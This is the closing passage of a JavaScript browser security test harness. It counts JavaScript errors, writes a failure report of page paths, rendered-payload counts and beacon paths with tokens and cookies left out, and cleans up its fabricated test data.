  console.log(`JavaScript errors: ${results.reduce((n, r) => n + ((r.report && r.report.errors) || []).length, 0)}`);

  // Diagnostics, only when something failed, and only what this harness
  // produced: page labels, probe reports, console refusals and beacon paths.
  // No cookie, no CSRF token, no claim token and no delivery detail ever passes
  // through here — the cookies live in a local variable that is never printed,
  // and every value seeded is fabricated.
  if (failures) {
    const dir = path.join(ROOT, '.browser-security');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(
      path.join(dir, 'report.json'),
      JSON.stringify(
        {
          generated_from: 'test/browser-hostile-data.js',
          note: 'Fabricated data only. Contains no credentials, tokens or delivery details.',
          surfaces: planted.map((p) => ({ surface: p.surface, family: p.family })),
          pages: results.map((r) => ({
            label: r.label,
            // Path only. The query strings and fragments here hold fabricated
            // payloads rather than real tokens, but an artifact containing the
            // literal text "token=…" is one somebody has to read carefully
            // before believing, and that is a cost with no benefit.
            path: r.urlPath.split(/[?#]/)[0],
            dom_bytes: r.domBytes,
            payloads_rendered: r.visible,
            report: r.report,
            console: r.consoleRefusals,
            beacons: r.newBeacons,
          })),
        },
        null,
        2
      )
    );
    console.log(`\nDiagnostics written to ${path.relative(ROOT, dir)}/report.json`);
  }

  await unseed();
  server.close();
  proxy.close();
  await pool.end();
  process.exit(failures ? 1 : 0);
})().catch(async (e) => {
  console.error(e);
  try { await unseed(); } catch (_) { /* best effort */ }
  process.exit(1);
});
